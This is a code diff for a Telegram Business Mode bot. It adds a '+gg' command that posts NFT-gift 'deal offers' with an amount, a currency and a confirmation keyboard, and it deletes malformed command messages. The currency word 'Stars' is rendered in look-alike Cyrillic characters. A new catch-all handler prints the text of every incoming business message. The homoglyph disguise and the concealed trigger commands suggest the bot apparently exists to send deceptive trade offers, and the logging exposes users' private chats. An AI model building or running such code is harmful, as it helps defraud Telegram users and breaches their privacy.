@@ -77,9 +77,12 @@ def format_amount(value: str) -> str:
         return value
 
 def mask_stars(currency: str) -> str:
-    if currency.lower() == "stars":
+    c = currency.strip().lower()
+    if c == "stars":
         return "Ѕtаrѕ"
-    return currency.capitalize()
+    elif c == "ton":
+        return "TON"
+    return currency.upper() if len(currency) <= 4 else currency.capitalize()
 
 HOMOGLYPH_CYR = {
     "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
@@ -164,7 +167,7 @@ def parse_nft_input(arg: str):
         slug = arg
     m = SLUG_RE.match(slug)
     if not m:
-        raise ValueError("bad slug")
+        raise ValueError(f"Неверный формат NFT ссылки/slug: '{arg}'")
     name_raw = m.group(1)
     num = int(m.group(2))
     name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_raw)
@@ -232,13 +235,16 @@ def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
         ]
     ])
 
-@dp.business_message(F.text.startswith("+rep "))
-async def cmd_rep_business(message: types.Message):
+# ==================== ХЭНДЛЕР КОМАНДЫ +gg ====================
+@dp.business_message(F.text.startswith("+gg "))
+async def cmd_gg_business(message: types.Message):
+    print(f"[DEBUG] Сработал +gg: {message.text!r}")
     args = message.text.split()
     
-    # ИСПРАВЛЕНИЕ: Добавлен лог, чтобы видеть причину срабатывания удаления
+    # Формат ожидает: +gg <nft_link> <amount> <currency> <lang>
+    # Пример: +gg solid-123 125 stars ru
     if len(args) < 3:
-        print(f"[DEBUG] Ошибка: слишком мало аргументов в команде -> {message.text!r}")
+        print(f"[DEBUG] Ошибка: Недостаточно аргументов. Ожидалось 3+, получено {len(args)-1}")
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
@@ -258,8 +264,7 @@ async def cmd_rep_business(message: types.Message):
         nft_num_formatted = format_amount(str(nft_num))
         nft_full_name = f"{nft_name} #{nft_num_formatted}"
     except ValueError as e:
-        # ИСПРАВЛЕНИЕ: Логируем ошибку парсинга ссылки/названия подарка
-        print(f"[DEBUG] Ошибка парсинга NFT аргумента '{nft_arg}': {e}")
+        print(f"[DEBUG] Ошибка парсинга NFT: {e}")
         try:
             await bot.delete_business_messages(
                 business_connection_id=message.business_connection_id,
@@ -319,7 +324,7 @@ async def cmd_rep_business(message: types.Message):
             parse_mode="HTML",
             business_connection_id=message.business_connection_id,
         )
-        print(f"[OFFER] Успешно отправлено! Язык: {lang}")
+        print(f"[OFFER] Оффер +gg успешно отправлен! Оффер ID: {order_id}, Валюта: {currency_text}")
     except Exception as e:
         print(f"[SEND ERROR] Ошибка отправки сообщения: {e}")
         
@@ -419,11 +424,11 @@ async def process_confirm(callback: CallbackQuery):
     await callback.answer()
 
 @dp.business_message()
-async def debug_business(text: types.Message):
-    pass
+async def debug_business(message: types.Message):
+    print(f"[DEBUG LOG ALL] Любое пришедшее бизнес-сообщение: {message.text!r}")
 
 async def main():
-    print("Бот запущен (Business Mode)...")
+    print("Бот запущен (Business Mode с командой +gg)...")
     await dp.start_polling(
         bot,
         allowed_updates=[
